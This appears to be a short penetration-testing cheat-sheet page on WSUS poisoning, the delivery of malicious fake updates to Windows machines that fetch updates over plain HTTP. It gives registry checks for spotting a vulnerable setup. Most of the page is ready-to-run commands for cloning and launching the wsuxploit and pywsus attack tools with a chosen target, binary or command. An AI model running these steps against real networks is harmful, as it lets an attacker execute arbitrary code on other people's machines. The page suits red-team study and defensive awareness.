# WSUS Poison

## Brief

You can compromise the system if the updates are not requested using **httpS** but **http**.

```powershell
# Check if the network uses a non-SSL WSUS update by running the following :
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
# If you get a reply such as:
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
	  
# and if this returns 1 :
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
# this is exploitable. If the last registry is equals to 0, then, the WSUS entry will be ignored.
```

### Exploit

#### WSUXPloit

{% embed url="https://github.com/pimps/wsuxploit" %}

```bash
git clone https://github.com/pimps/wsuxploit.git
sudo apt-get install samba dsniff iptables python
pip install twisted
cd wsuxploit/
git clone https://github.com/ctxis/wsuspect-proxy.git
./wsuxploit.sh $TARGET_IP $WSUS_IP $WSUS_PORT $BINARY_PATH
```

#### PYWSUS

{% embed url="https://github.com/GoSecure/pywsus" %}

```bash
git clone https://github.com/GoSecure/pywsus.git
cd pywsus/
pip install -r requirements.txt
python pywsus.py -H $HOST -c $COMMAND -e $EXECUTABLE
```
